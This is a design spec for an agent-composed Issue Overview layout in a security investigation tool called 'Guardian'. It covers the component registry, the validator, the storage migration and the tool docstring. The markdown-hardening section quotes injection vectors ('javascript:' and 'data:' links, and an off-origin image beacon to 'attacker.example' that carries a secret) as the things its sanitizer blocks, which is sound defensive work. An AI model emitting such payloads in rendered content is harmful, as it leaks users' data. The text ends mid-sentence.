# v0.3.0 — Dynamic agent-composed investigation layouts (design)

> Produced 2026-06-13 by a multi-agent research+design workflow (AG-UI / Google A2UI-UI2A / commercial GenUI sweep -> synthesis -> adversarial review -> revise). 7 agents. Descoped to **Issues-only** in review (case half -> v0.3.1). NOT yet operator-approved.

---

Every critique claim is now confirmed against the codebase:

1. **#1 reset path** — `update_issue` skips `None` (line 340); the `null`-clear is a no-op. Confirmed.
2. **#2 case under-scope** — case page has no EditableSection/tabs/kindLayout/Overview; `update_case` (line 438) only accepts `("title", "description", "status")` — no text fields. Confirmed.
3. **#3 field enum / tab identity** — Overview = `summary · scope · recommendations` (lines 279-281); Assessment = `conclusions · next_steps` (lines 287-288). The 5-field enum would let the agent pull Assessment fields onto Overview. Confirmed.
4. **#5 leanness** — `list_issues` uses `SELECT *` (line 328) → `_row_to_issue` (line 711) maps columns explicitly by name, so a new `layout_spec` column does NOT enter the `Issue` dataclass via `_row_to_issue`. The payload stays lean **because** `_row_to_issue` enumerates fields — not because the SELECT does. So the leanness claim holds, but the *reason* in the original spec (`SELECT *` would be the failure path) needs correcting: the protection is the explicit `_row_to_issue` mapping, not column-enumerated SQL.

I now have full grounding. Here is the final, complete, executable design spec with the critique folded in.

---

# Guardian v0.3.0 — Dynamic Agent-Composed Investigation Layouts

**Design spec. Status: ready for issue + spec-approval. Classification: Scenario 1 (code-only, installer unchanged → minor version). Contained-release scope: one concept — "the agent composes an *Issue* detail Overview layout from a closed component registry."**

This is "A2UI-shaped" done in-house: the agent is the *layout author* constrained to a fixed vocabulary; the UI is the *trusted renderer + validator* that owns the vocabulary. It reuses Guardian's existing SVG-sandboxing precedent exactly — the agent emits **data** (a validated JSON spec), never executable markup, identical in spirit to `issue_set_attack_chain` / `issue_set_relation_graph`.

> **Revision note (adversarial-critique pass).** This spec is the revised, executable version. Every High/Med/Low finding from the critique is resolved inline; each resolution is tagged **[Resolved #N]** at the point it bites. The single biggest change: **the release is descoped to Issues-only** (the case half was mis-represented as a free ride; the case detail page has no Overview/tab/`EditableSection` host to overlay — see [Resolved #2]). Cases ship as a separately-specced v0.3.1. Two other High findings — the broken `null`-clear reset path and the `field`-enum tab-identity violation — are corrected in §3.1, §5.1, §6.1, §6.4, and §2.2 respectively.

---

## 0. Critique-resolution ledger (authoritative — read first)

Every issue from the adversarial critique, where it is resolved, and the verification that backs it. This ledger is the contract: if a later section contradicts it, the ledger wins.

| # | Sev | Finding | Resolution | Where | Verified |
|---|---|---|---|---|---|
| 1 | High | `PATCH {layout_spec: null}` cannot clear the column — `update_issue` skips `None` | Reset goes through a **dedicated sentinel-aware branch in `patch_issue`** that calls `store.set_issue_layout(id, None)` directly, NOT through `update_issue`. Unit-tested "PATCH null → GET null." | §3.1, §6.1, §6.4, §10 step 3 | `investigation_store.py:340` — `if key in fields and fields[key] is not None` confirmed skips None |
| 2 | High | Case half is drastically under-scoped — case page is not the same code path | **Descoped to Issues-only.** All `case_set_layout`, `cases` migration, case-page work removed from v0.3.0. Filed as v0.3.1 with its own issue once a case-page Overview structure is designed. | §1, §4, §5, §6, §7, §10, §11 Q1 | `cases/[id]/page.tsx` has no EditableSection/tabs/kindLayout/Overview (grep empty); `update_case` accepts only `title\|description\|status` (`investigation_store.py:438`) |
| 3 | High | `field` enum (5 fields) lets the agent place Assessment-tab fields on the Overview tab → dual-edit/tab-identity violation | **`field` enum constrained to the 3 Overview fields:** `summary \| scope \| recommendations`. `conclusions`/`next_steps` are NOT addressable by the Overview-body spec. Tab identity provably preserved. | §2.2, §2.4, §3.1, §5.1, §8.2 | Overview = summary/scope/recommendations (issue page L279-281); Assessment = conclusions/next_steps (L287-288) |
| 4 | Med | `version` major-rejection forward-incompatible; renderer "rejects unknown majors" unspecified on degrade | Write-time validator hard-rejects unknown major (correct). **Renderer treats unknown major as `parseLayoutSpec → null → static fallback`, never throws.** Stated explicitly. | §2.1, §3.1, §3.3, §7.4 | — (design contract) |
| 5 | Med | "byte-for-byte unchanged list payload" claim depends on list SELECT not being `SELECT *` | **Claim corrected at the root.** `list_issues` IS `SELECT *`, BUT `_row_to_issue` maps columns *by name explicitly* and never reads `layout_spec`, so the column never enters the `Issue` DTO. Leanness holds **because of the explicit mapper**, not the SQL. Added a regression test asserting `Issue` has no `layout_spec` attr. | §4.2, §10 step 1 | `list_issues` SELECT * (`investigation_store.py:328`); `_row_to_issue` enumerates 15 named columns, no `layout_spec` (L711-719) |
| 6 | Med | Markdown injection under-verified on link/image protocols (`javascript:`, `data:`, off-origin image beacons) | react-markdown `^9.0.1` ships default `urlTransform` (sanitizes `javascript:`/`data:` since v9). **Pin `>=9 <10`.** Renderer passes `disallowedElements={['img']}` (kills image beacons) + a `urlTransform` that drops non-`https:`/relative hrefs. Validator/renderer tests assert a `javascript:` link, a `data:` link, and an off-origin `![]()` image are neutralized. | §2.5, §3.4, §7.3, §10 step 4 | `package.json` pins `react-markdown: ^9.0.1`; no `rehype-raw`/`dangerouslySetInnerHTML` in tree |
| 7 | Med | Per-string cap × blocks × arrays can exceed the 48 KB byte cap — caps not mutually consistent; order matters | **Per-string caps lowered** so the worst case fits under the byte cap, AND **the byte cap is applied AFTER clamping** so an over-byte spec soft-degrades (truncate/drop) rather than hard-rejecting the whole layout. Authoritative cap order documented. | §3.1 (rules reordered), §3.5 | — (arithmetic in §3.5) |
| 8 | Med | `cleaned["spec"]` / `cleaned["dropped"]` return shape contradicts the stated `(dict\|None, str\|None)` signature | **Validator signature fixed** to `(result, err)` where `result = {"spec": <cleaned>, "dropped": [...]}`. Tool reads `result["spec"]` / `result["dropped"]`. Tests assert exact shape. | §3.1, §5.1, §10 step 1 | — (design contract) |
| 9 | Med | `stat_cards`/`kv_table` `value` is "plain text" but example passes int — coercion unspecified; `len(42)` crashes | Validator **explicitly accepts `int\|float\|str`** for `value`, **stringifies before the length cap**. Tested with `value:42` and `value:"x"*N`. | §2.2, §3.1, §3.5 | — (design contract) |
| 10 | Low | `icon` is regex-bounded, not a closed enum — "closed registry" framing overstated | Wording corrected: **icon is "pattern-bounded (safe charset `^[a-z0-9_]{1,32}$`, length-capped)"; all *style/tone* tokens are closed-enum.** Security section no longer claims "everything is a closed enum." | §2.2, §3.4, §11 | — (wording) |
| 11 | Low | Skill `description` front-matter ~110 words — dilutes retrieval | **Description cut to one trigger sentence.** Registry/security/templates moved into the skill body (§8.2 already houses them). | §8.1 | — (wording) |
| 12 | Low | No test for the `dropped[]` self-correction round-trip; no observability event | Added an **observability event `investigation.layout_composed`** (block count + dropped count) emitted by the tool. Added a **round-trip test**: partially-bad spec → assert `dropped[]` → corrected spec → assert clean store. | §5.1, §5.5, §10 step 2 & 6 | observability event bus exists (`/observability/events`) |

---

## 1. Goal & non-goals

**Goal.** Let the agent dynamically compose the **Overview-tab body** of an **Issue** detail page per investigation, picking from a **closed, in-house component registry** and filling **typed props**, instead of being limited to the static three `EditableSection`s (Summary/Scope/Recommendations) the Overview tab renders today. The agent emits a validated JSON `layout_spec` (server-validated against a closed enum of component types + per-type prop schemas), persisted per-issue in `investigations.db`, and rendered by a new `<LayoutRenderer>` that maps spec nodes onto the *existing* investigation primitives (`EditableSection`, `StatCard`, `IndicatorRow`, `Badge`, `MarkdownContent`, the diagram `<img>` embed, etc.). A phishing issue can foreground the sender/lookalike-domain/credential-URL triad; a malware issue can foreground the binary hash + C2 + host-isolation status — each composed for *that* investigation's context, not a fixed template.

**Scope: Issues-only for v0.3.0. [Resolved #2]** The original design claimed Cases were "the same code path — the case page already exists." That is materially false: `mcp/agent/app/investigation/cases/[id]/page.tsx` has **no `EditableSection`, no tab system, no `kindLayout`/Overview body** to overlay, and `update_case` accepts only `title|description|status` (no text fields for a `field` block to bind to — verified `investigation_store.py:438`). Delivering case layouts means *first building a tabbed Overview structure on the case page from scratch* — a separate concept that violates contained-release discipline if smuggled into this release. **Cases are deferred to v0.3.1**, which gets its own GitHub Issue and its own design once the case-page Overview structure is specced. This release is exactly one concept: *the agent composes an Issue Overview layout.*

**Non-goals.**
- No arbitrary React/HTML/markdown-as-markup emission — the agent never ships executable strings (no `dangerouslySetInnerHTML`, no `eval`, no dynamic `import`, no `rehype-raw`); the registry is closed and cannot be extended at runtime.
- No new component primitives invented in this release (the registry is built *from existing* `ui.tsx` exports + the existing diagram embed).
- No replacement of the static fallback — the three default `EditableSection`s stay as the graceful fallback whenever no spec exists or a spec fails to parse.
- **No cross-tab field placement. [Resolved #3]** The Overview-body spec can only address the three fields that *already live on Overview* (`summary | scope | recommendations`). It can NOT surface `conclusions` or `next_steps` — those remain exclusively on the Assessment tab. This is what makes the "tab identity stays stable" claim *true*, not aspirational: there is no spec input that can place an Assessment field on Overview, so the dual-edit hazard is closed by construction.
- No change to the tab system's identity (Overview/Assessment/Indicators/Activity/Attack chain/Relations) — the spec composes the **Overview tab body**; the other five tabs are untouched.
- No credential surface, no installer change, no storage-schema break (additive `ALTER TABLE … ADD COLUMN` on `issues` only, mirroring the v0.1.8 `attack_chain_svg` migration).
- No Cases work (see scope note above).

---

## 2. The layout-spec schema

### 2.1 Shape (top-level)

The agent emits a single JSON object. **Flat-ish, shallow, declarative** — following A2UI's design lesson that a flat list with light nesting is easier for an LLM to emit and for the client to stream/validate than a deep tree.

```jsonc
{
  "version": 1,                       // spec version (int). Write-validator rejects unknown majors;
                                      //   renderer degrades unknown majors to static (never throws). [Resolved #4]
  "icon": "phishing",                 // OPTIONAL header glyph override (Material Symbol name, pattern-bounded)
  "accent": "text-error",             // OPTIONAL header accent (closed whitelist token only)
  "focus": "Confirm whether the target entered credentials on acme-login.co.",
  "blocks": [                         // ordered list of registry component nodes (the Overview body)
    { "type": "...", "props": { ... } }
  ]
}
```

- `version` (int, required) — schema version. v0.3.0 ships `1`. **Write-time validator hard-rejects any `version != 1`** (forward-compat guard). **The renderer treats an unrecognized major as `parseLayoutSpec → null → static fallback`; it never throws on a future-major stored spec. [Resolved #4]**
- `icon` / `accent` / `focus` — **header overrides** that supersede the matching `KIND_LAYOUT[kind]` fields. All optional; each falls back to `kindLayout(kind)` individually if absent or invalid.
- `blocks` (array, required, **max 24**) — the ordered component nodes composing the **Overview tab body**. Replaces the current hardcoded three `EditableSection`s on that tab *when present and non-empty*. Empty array is legal (renders nothing → renderer falls back to the static three sections).

### 2.2 The CLOSED component registry

Every block has a `type` (closed enum, lowercase snake) + a typed `props` object. The registry is built entirely from primitives that already exist in `mcp/agent/components/investigation/ui.tsx` (and the diagram `<img>` embed in the issue detail page) — **no new primitives in this release.** Unknown types are *dropped* (not passed through).

| `type` tag | Maps to (real ui.tsx export) | Typed props | Notes |
|---|---|---|---|
| `text` | `MarkdownContent` (in glass card) | `{ title?: string, icon?: string, markdown: string }` | Free prose / analyst narrative. Markdown is **rendered by react-markdown — sanitized React tree, never raw HTML; images disallowed; non-https links dropped** (see §2.5/§3.4). |
| `field` | `EditableSection` | `{ field: enum, label?: string, icon?: string }` | **`field` ∈ the 3 OVERVIEW editable fields only: `summary \| scope \| recommendations`. [Resolved #3]** `conclusions`/`next_steps` are NOT addressable (they live on Assessment; surfacing them here would create two edit surfaces for one column). Renderer wires `value`+`onSave` to the real issue field — the agent CANNOT invent a `fieldKey`; it can only reorder/relabel the three Overview fields. |
| `kv_table` | tiny presentational table built from `Badge` + glass card | `{ title?: string, icon?: string, rows: { label: string, value: string\|number, tone?: token }[] }` | Key-value summary. `rows` capped at 20. `value` accepts `int\|float\|str`, **stringified before display + length-check [Resolved #9]**; rendered as an escaped React text node. |
| `badge_row` | `Badge[]` in a flex row | `{ title?: string, badges: { text: string, tone?: token }[] }` | Quick disposition chips. `badges` capped at 16. |
| `stat_cards` | `StatCard[]` in a grid | `{ cards: { icon: string, label: string, value: string\|number, tone?: token }[] }` | At-a-glance counters. `cards` capped at 8. `value` accepts `int\|float\|str`, stringified before display **[Resolved #9]**. |
| `list` | `<ol>`/`<ul>` of markdown items in a glass card | `{ title?: string, icon?: string, ordered?: boolean, items: string[] }` | Checklists / step lists. `items` capped at 30; each item rendered as inline markdown (same sanitize config as `text` — images disallowed, non-https links dropped). |
| `indicators` | `IndicatorRow[]` (live data) | `{ title?: string, emphasizeTypes?: indicatorType[], filterTypes?: indicatorType[] }` | **References live data, carries none.** Renderer pulls the issue's already-fetched `issueIndicators`, optionally filters/emphasizes by IoC type (closed enum). The agent picks *which IoCs to foreground*, not their values. |
| `diagram` | diagram `<img>` data-URI embed (read-only) | `{ which: "chain" \| "relations", title?: string }` | Inline-embeds the already-generated attack-chain or relations SVG (rendered sandboxed as `<img>` data-URI exactly as today). `which` is a 2-value enum. No SVG in the spec — it references the SVG already stored on the issue. |
| `columns` | CSS grid container | `{ columns: 2 \| 3, children: Block[] }` | A container. **Nesting allowed exactly one level** (children may NOT be `columns` or `section` — enforced by validator, §3.1 rule 4). `children` capped at 6. |
| `section` | titled glass wrapper | `{ title: string, icon?: string, children: Block[] }` | Visual grouping with a heading. One level of nesting; children may NOT be `section` or `columns`. `children` capped at 8. |

`token` (the `tone`/`accent` prop type) is a **closed whitelist** of Material-3 semantic class strings (§3.2) — never a free string, never a hex literal.

`icon` is **pattern-bounded, not enumerated [Resolved #10]**: it must match `^[a-z0-9_]{1,32}$` (a safe charset, length-capped). Material Symbols renders an unknown-but-safe name as a fallback glyph or nothing — no injection vector — but it is accurately described as *pattern-bounded*, not *closed-enum*.

`indicatorType` enum = `ip | domain | url | file_hash | email | cve | host | account` (mirrors `INDICATOR_TYPES` in the store and `INDICATOR_TYPE_ICON` in `investigation.ts`).

### 2.3 Concrete example — a phishing Issue

```json
{
  "version": 1,
  "icon": "phishing",
  "accent": "text-error",
  "focus": "Sender + lookalike domain + the credential-harvest URL. The one question that decides severity: did the target submit credentials?",
  "blocks": [
    {
      "type": "kv_table",
      "props": {
        "title": "Phishing essentials",
        "icon": "mail",
        "rows": [
          { "label": "Sender", "value": "it-support@acme-login.co", "tone": "text-error border-error/40 bg-error/10" },
          { "label": "Lookalike domain", "value": "acme-login.co (legit: acme-login.com)", "tone": "text-tertiary border-tertiary/40 bg-tertiary/10" },
          { "label": "Credential-harvest URL", "value": "hxxps://acme-login.co/sso/verify" },
          { "label": "Credentials submitted?", "value": "NO — proxy blocked POST", "tone": "text-secondary border-secondary/40 bg-secondary/10" }
        ]
      }
    },
    {
      "type": "stat_cards",
      "props": {
        "cards": [
          { "icon": "group", "label": "Recipients", "value": 42, "tone": "bg-primary/15 text-primary" },
          { "icon": "report", "label": "Reported", "value": 7, "tone": "bg-tertiary/15 text-tertiary" },
          { "icon": "ads_click", "label": "Clicked", "value": 3, "tone": "bg-error/15 text-error" }
        ]
      }
    },
    {
      "type": "columns",
      "props": {
        "columns": 2,
        "children": [
          { "type": "field", "props": { "field": "summary", "label": "What happened", "icon": "summarize" } },
          { "type": "field", "props": { "field": "recommendations", "label": "Containment", "icon": "shield" } }
        ]
      }
    },
    {
      "type": "indicators",
      "props": {
        "title": "Foregrounded IoCs",
        "emphasizeTypes": ["domain", "url", "email"],
        "filterTypes": ["domain", "url", "email", "ip"]
      }
    },
    {
      "type": "text",
      "props": {
        "title": "Analyst note",
        "icon": "lightbulb",
        "markdown": "The lookalike domain `acme-login.co` was registered **4 days ago** (NameSilo). No prior reputation. Recommend blocking at the proxy + adding to the SOAR indicator feed."
      }
    }
  ]
}
```

> Note every `field` block above addresses only `summary`/`recommendations` — both Overview fields. A spec naming `field: "conclusions"` would have that block **dropped** by the validator [Resolved #3].

### 2.4 The `field` enum — explicit closed set

The `field` prop is validated against **exactly three values**, defined once in `layout_spec.py` and mirrored in `investigation.ts`:

```
OVERVIEW_FIELDS = ("summary", "scope", "recommendations")
```

A `field` block whose `field` value is not in this set (including `conclusions`, `next_steps`, or any invented key) is **dropped** (recorded in `dropped[]`), not rejected. This is the structural guarantee behind the "tab identity stays stable" non-goal [Resolved #3].

### 2.5 Markdown render policy (link/image hardening) [Resolved #6]

The `markdown` prop on `text` and the `items[]` on `list` are the only free-text-with-formatting fields. They are rendered through `MarkdownContent` (react-markdown), with this **hardened, explicitly-specified** configuration — not "trust me, it's safe":

- **react-markdown pinned `>=9 <10`** (`package.json` currently `^9.0.1`). v9 ships a built-in default `urlTransform` that strips `javascript:`, `vbscript:`, and dangerous `data:` URIs on `href`/`src`. The pin guards against a downgrade silently removing that default.
- **No `rehype-raw`, no `dangerouslySetInnerHTML`** anywhere in the render path (verified absent from the tree). react-markdown parses markdown to a sanitized React element tree; raw HTML in the string is rendered as literal text, never as markup.
- **Images disallowed:** the `MarkdownContent` instance the renderer uses passes `disallowedElements={['img']}` (and `unwrapDisallowed`). This kills the off-origin image-beacon exfil vector (`![](https://attacker.example/track.gif?d=$secret)`) — images simply don't render.
- **Link `urlTransform` tightened:** a custom `urlTransform` that allows only `https:`-scheme and relative/anchor hrefs; everything else (including `http:`, `javascript:`, `data:`, `mailto:` if undesired) is dropped to `#`. This is stricter than react-markdown's default and removes the `[click](javascript:…)` and off-origin tracking-link vectors.

Tests assert: a `javascript:` link, a `data:` link, and an off-origin `![]()` image are all neutralized in the rendered output (§10 step 4).

---

## 3. Server-side validation

Validation runs **server-side at write time** (in the MCP tool, before storage) **and** is re-checked defensively at render time (the renderer drops anything malformed). Write-time validation is authoritative; render-time is defense-in-depth. This mirrors the `issue_set_attack_chain` discipline (validate shape + strip active content before storage; render sandboxed).

### 3.1 The validator (new module: `bundles/spark/mcp/src/usecase/layout_spec.py`)

A pure, dependency-light function. **Signature (corrected) [Resolved #8]:**

```python
def validate_layout_spec(spec: Any) -> tuple[dict | None, str | None]:
    """Returns (result, None) on success or (None, error_message) on hard reject.
    On success, result is a WRAPPER dict:
        {"spec": <cleaned_spec_dict>, "dropped": [<warning_str>, ...]}
    The caller reads result["spec"] (store this) and result["dropped"]
    (return to the agent for self-correction)."""
```

Pure Python (no pydantic dependency needed for this shallow shape, matching `investigation_tools.py`'s plain-function convention), exhaustively unit-tested in `tests/`.

**Validation rules, in authoritative order. [Resolved #7 — byte cap is applied LAST, after clamping]:**

1. **Type & top-level shape.** `spec` must be a `dict`. `version` must be `int` and `== 1` (hard-reject unknown majors with a clear message — forward-compat guard). `blocks` must be a `list`.
2. **Block count cap.** `len(blocks)` ≤ **24** → hard reject if over (a spec this large is almost certainly malformed).
3. **Depth cap.** Containers (`columns`, `section`) nest **exactly one level**. A `columns`/`section` whose `children` contains another `columns`/`section` → that child is dropped. Total node count (including nested) ≤ **48**.
4. **Closed type enum.** Each block's `type` ∈ the 10-value registry enum (§2.2). **Unknown types → the block is dropped** (validator removes it, records a warning in `dropped[]`; it does NOT reject the whole spec — graceful degrade so one bad block doesn't lose the whole layout).
5. **Per-type prop schema + clamp.** Each block's `props` validated against its type's schema:
   - Required props present and correct primitive type. A block whose required props are missing/wrong-typed → dropped.
   - Enum props checked against their closed set: **`field` ∈ `{summary, scope, recommendations}` [Resolved #3]**; `which` ∈ `{chain, relations}`; `columns` ∈ `{2,3}`; `emphasizeTypes`/`filterTypes` items ∈ the 8 indicator types.
   - **`value` coercion [Resolved #9]:** `kv_table.rows[].value` and `stat_cards.cards[].value` accept `int | float | str`. Non-string values are **stringified (`str(v)`) before the length cap is applied** — `len(42)` never executes on a raw int.
   - **`tone`/`accent` whitelist** (§3.2) — non-whitelisted → dropped to the type's default (not rejected). **`icon` pattern check** `^[a-z0-9_]{1,32}$` — non-conforming → dropped to default.
   - **Per-type array caps:** rows ≤ 20, badges ≤ 16, cards ≤ 8, items ≤ 30, `columns.children` ≤ 6, `section.children` ≤ 8. Over-cap arrays are **truncated** (soft), recorded in `dropped[]`.
   - **String length caps [Resolved #7 — lowered for byte-budget consistency]:** see §3.5 for the reconciled numbers. Over-length strings are **truncated** (soft), not rejected.
6. **Byte cap — applied LAST, after all clamping/truncation [Resolved #7].** `len(json.dumps(cleaned_spec).encode("utf-8"))` ≤ **48_000 bytes**. Because the per-string/array caps in §3.5 are sized so the worst case fits well under 48 KB, this should almost never fire. If it somehow does (pathological unicode expansion), the validator **truncates the `blocks` list from the end** until under budget (soft degrade), recording a `dropped[]` warning — it does NOT hard-reject the whole layout. (Hard reject is reserved for the structural failures in rules 1-2.)
7. **Output.** `result["spec"]` contains only valid blocks with clamped props; `result["dropped"]` lists every soft action taken. If *all* blocks were dropped and no valid header override remains, `result["spec"]["blocks"] == []` (renderer treats as "fall back to static").

### 3.2 The token whitelist (single source of truth)

`tone`/`accent` props accept only Material-3 semantic class strings — **no hex, no arbitrary Tailwind.** The whitelist is defined ONCE on the Python side (`layout_spec.py`) and mirrored on the TS side (`lib/api/investigation.ts`) so both validate identically:

```
text-primary  text-secondary  text-tertiary  text-error  text-on-surface  text-on-surface-variant
+ the composite badge/stat tones already used in investigation.ts:
  "text-error border-error/40 bg-error/10"
  "text-tertiary border-tertiary/40 bg-tertiary/10"
  "text-primary border-primary/40 bg-primary/10"
  "text-secondary border-secondary/40 bg-secondary/10"
  "text-on-surface-variant border-outline-variant bg-surface-container-high"
+ the StatCard icon tones: "bg-primary/15 text-primary", "bg-tertiary/15 text-tertiary",
  "bg-error/15 text-error", "bg-secondary/15 text-secondary"
```

These are exactly the tone strings already present in `SEVERITY_TOKENS`, `STATUS_TOKENS`, `verdictTone()`, `dbotMeta()`, and `StatCard`'s default — so the registry's palette is the investigation module's *existing* palette, guaranteeing theme-aware rendering with zero new tokens. Any `tone` not in the set is silently replaced with the type's default.

### 3.3 Reject-and-fallback behavior

- **Hard reject** (tool returns `{"error": …}`, nothing stored): not a dict; bad `version`; `blocks` not a list; over the 24-block / 48-node caps (rules 1-2). The agent sees the error and can retry (same pattern as the SVG tools).
- **Soft degrade** (stored, with dropped items logged): unknown block types, malformed props, non-whitelist tones/icons, over-cap arrays/strings, and the rare over-byte case (rules 3-6). The cleaned spec is stored; `dropped[]` is returned to the agent so it can self-correct on a later pass.
- **Render-time** (defense-in-depth, §7): the renderer re-runs the same closed-enum checks client-side; anything that slips through is dropped, and a totally empty/invalid spec — **including a stored spec whose major version the renderer doesn't recognize [Resolved #4]** — causes `parseLayoutSpec` to return `null`, and the page falls through to the static three `EditableSection`s. The renderer never throws to a blank page.

### 3.4 Why this is injection-safe

The `markdown` prop on `text`/`list` is the only free-text-with-formatting field, and it is hardened per §2.5 (react-markdown ≥9, no raw HTML, **images disallowed, non-https links dropped** [Resolved #6]). Every other field is either a **closed enum** (`type`, `field`, `which`, `columns`, indicator types), a **closed-whitelist token** (`tone`, `accent`), a **pattern-bounded safe string** (`icon` — `^[a-z0-9_]{1,32}$`, accurately *pattern-bounded* not enumerated [Resolved #10]), a **number**, or **plain text rendered as an auto-escaped React text node** (`label`, `value`, `text`). **The spec is JSON describing intent; it can never become executable code** — identical to the SVG-as-`<img>` precedent.

### 3.5 Cap reconciliation (caps are mutually consistent) [Resolved #7]

The original spec's per-string cap (4,000 chars) × per-array cap × block cap could describe ~84 KB in a single `kv_table` — exceeding the 48 KB byte cap, so a per-field-valid spec could still hard-reject. **Reconciled numbers** (sized so the per-field worst case fits comfortably under 48 KB, AND the byte cap is applied last as a soft truncation):

| Cap | Value | Worst-case contribution |
|---|---|---|
| `markdown` (per `text` block / `list` item) | **2,000 chars** | the deliberate "long prose" budget |
| `value` (kv_table row / stat card), stringified | **400 chars** | — |
| `label` / `title` / `text` (badge) | **160 chars** | — |
| `kv_table.rows` | 20 | 20 × (160 + 400) ≈ 11.2 KB / block |
| `stat_cards.cards` | 8 | small |
| `badge_row.badges` | 16 | small |
| `list.items` | 30 × 2,000 ≈ 60 KB *worst case* | **see note** |
| blocks (top-level) | 24 | — |
| total nodes (incl. nested) | 48 | — |
| **byte cap (authoritative ceiling)** | **48,000 bytes**, applied AFTER clamping | truncates `blocks` from the end if exceeded (soft) |

**Note on `list.items`:** 30 × 2,000 alone exceeds 48 KB, so `list` item strings are additionally capped at **600 chars** (a list item is a short step, not an essay). 30 × 600 = 18 KB — within budget. The byte cap remains the authoritative ceiling: clamp first, then if `json.dumps` still exceeds 48 KB (pathological), truncate `blocks` from the end and record in `dropped[]`. **Authoritative rule: the byte cap wins, and it degrades softly, never hard-rejecting a per-field-valid spec.**

---

## 4. Storage

Additive, backwards-compatible, mirrors the v0.1.8 `attack_chain_svg` / v0.2.1 `relations_canvas_svg` migrations exactly. **Only the `issues` table gets a `layout_spec` column in v0.3.0** (Cases descoped — [Resolved #2]).

### 4.1 Schema migration — `bundles/spark/mcp/src/usecase/investigation_store.py`

In `_init_schema()`, after the existing `relations_canvas_svg` migration block, add:

```python
# v0.3.0 — dynamic agent-composed layout spec (validated JSON string) on
# issues. Off the lean list payload (read only on detail). Cases deferred to v0.3.1.
issue_cols3 = {r["name"] for r in c.execute("PRAGMA table_info(issues)")}
if "layout_spec" not in issue_cols3:
    c.execute("ALTER TABLE issues ADD COLUMN layout_spec TEXT")
```

The base `CREATE TABLE IF NOT EXISTS issues (…)` gets `layout_spec TEXT` added to its column list too (so fresh installs create the column directly; the `ALTER` covers upgrades). Nullable; `NULL` for all existing rows → static fallback. **No `cases` migration in v0.3.0.**

### 4.2 Store accessors (mirror `set_attack_chain` / `get_attack_chain`)

Add to `InvestigationStore` (issues only):

```python
def set_issue_layout(self, issue_id: str, spec_json: str | None) -> bool:
    """spec_json may be None to CLEAR the layout (reset to static).
    Unlike update_issue, this sets the column unconditionally — None
    means 'store NULL', not 'skip'. This is the reset path. [Resolved #1]"""
    with self._lock, self._conn() as c:
        cur = c.execute(
            "UPDATE issues SET layout_spec = ?, updated_at = ? WHERE id = ?",
            (spec_json, _now(), issue_id),
        )
    return cur.rowcount > 0

def get_issue_layout(self, issue_id: str) -> str | None:
    with self._lock, self._conn() as c:
        row = c.execute("SELECT layout_spec FROM issues WHERE id = ?", (issue_id,)).fetchone()
    return row["layout_spec"] if row else None
```

**`set_issue_layout` is the authoritative clear path [Resolved #1].** It writes the column unconditionally — passing `None` stores SQL `NULL`. It must NOT be routed through `update_issue`, whose `if … is not None` filter (verified `investigation_store.py:340`) would silently skip a `None` and leave the old layout in place.

**The `Issue` DTO deliberately does NOT gain a `layout_spec` field [Resolved #5].** This is what keeps `list_issues` payloads lean — and the protection is precise: `list_issues` runs `SELECT * FROM issues` (verified L328), so the raw row *does* carry the new column, **but `_row_to_issue` (L711-719) maps columns to the `Issue` dataclass by explicit name and never reads `layout_spec`.** The leanness holds **because of the explicit mapper, not because the SELECT enumerates columns.** A regression test asserts `Issue` has no `layout_spec` attribute and that `list_issues()` output is byte-identical pre/post-migration for a row with a populated `layout_spec` (§10 step 1). The spec rides only on the detail GET (§6).

---

## 5. Agent tool

One new catalog-side MCP tool (plus an optional clear tool), in `bundles/spark/mcp/src/usecase/builtin_components/investigation_tools.py`, alongside `issue_set_attack_chain` / `issue_set_relation_graph`. **No `case_set_layout` in v0.3.0 [Resolved #2].**

### 5.1 `issue_set_layout`

```python
def issue_set_layout(issue_id: str, layout_spec: dict[str, Any]) -> dict[str, Any]:
    """Compose the Issue detail page's Overview body from Guardian's component registry.

    Call this AFTER you understand the investigation (you've read/filled the
    issue and extracted indicators) to lay out the most decision-relevant
    facts for THIS investigation — instead of the default Overview layout.
    You pick component TYPES from a closed registry and fill typed props;
    you NEVER emit HTML/markup. The spec is JSON-validated + stored; the UI
    renders it on the Overview tab, falling back to the static three sections
    (Summary / Scope / Recommendations) when no spec exists or it fails to
    validate.

    Registry component types (the ONLY allowed `type` values), each with props:
      - "kv_table"   {title?, icon?, rows:[{label, value, tone?}]}  — key facts
      - "stat_cards" {cards:[{icon, label, value, tone?}]}          — counters
      - "badge_row"  {title?, badges:[{text, tone?}]}               — chips
      - "field"      {field, label?, icon?}  field ∈ summary|scope|
                     recommendations — an EDITABLE OVERVIEW field; you choose
                     which of the THREE to surface + relabel. You CANNOT
                     surface conclusions/next_steps here (those live on the
                     Assessment tab) and you cannot invent fields.
      - "indicators" {title?, emphasizeTypes?, filterTypes?}        — the
                     issue's live IoCs, foregrounded by type (you pick WHICH
                     types matter; the values come from the store)
      - "diagram"    {which, title?}  which ∈ chain|relations — embeds the
                     already-generated attack-chain / relations SVG
      - "list"       {title?, icon?, ordered?, items:[markdown]}
      - "text"       {title?, icon?, markdown}                      — prose
      - "columns"    {columns, children:[block]}  columns ∈ 2|3 — 1 nesting
                     level only; children cannot be columns/section
      - "section"    {title, icon?, children:[block]}              — grouping

    `tone`/`accent` are Material-3 semantic tokens from a fixed whitelist
    (e.g. "text-error border-error/40 bg-error/10") — NEVER hex, NEVER raw CSS.
    `icon` is a Material Symbol name (lowercase, [a-z0-9_], ≤32 chars).
    Markdown is sanitized (no HTML, no images, https links only). Unknown
    types / bad props are dropped (not fatal); the spec is capped at 48000
    bytes / 24 top-level blocks / 48 total nodes.

    WHEN to set a layout (analogy: like svg_attack_chain at resolve time):
      - phishing → kv_table (sender / lookalike domain / credential URL /
        "credentials entered?") + stat_cards (recipients/reported/clicked) +
        indicators emphasizing domain/url/email.
      - malware → kv_table (binary hash / C2 / host / isolation status) +
        indicators emphasizing file_hash/ip/host + diagram(chain).
      - lateral_movement / access_violation → kv_table (principal / logon
        type / source→dest hosts) + indicators emphasizing account/host/ip.
      Set the optional header `focus` to the single decision-driving question.

    Args:
        issue_id: The Issue id (from issue_create / issues_list).
        layout_spec: The layout object: {version:1, icon?, accent?, focus?,
            blocks:[{type, props}]}.  See the registry above. Load the
            `compose_investigation_layout` skill for templates per kind.

    Example: issue_set_layout(issue_id="…", layout_spec={"version":1,
        "icon":"phishing","accent":"text-error",
        "focus":"Did the target submit credentials?",
        "blocks":[{"type":"kv_table","props":{"title":"Phishing essentials",
        "rows":[{"label":"Sender","value":"it@acme-login.co"}]}}]})

    Returns: {"ok": true, "issue_id": …, "blocks": n, "dropped": [...]} or
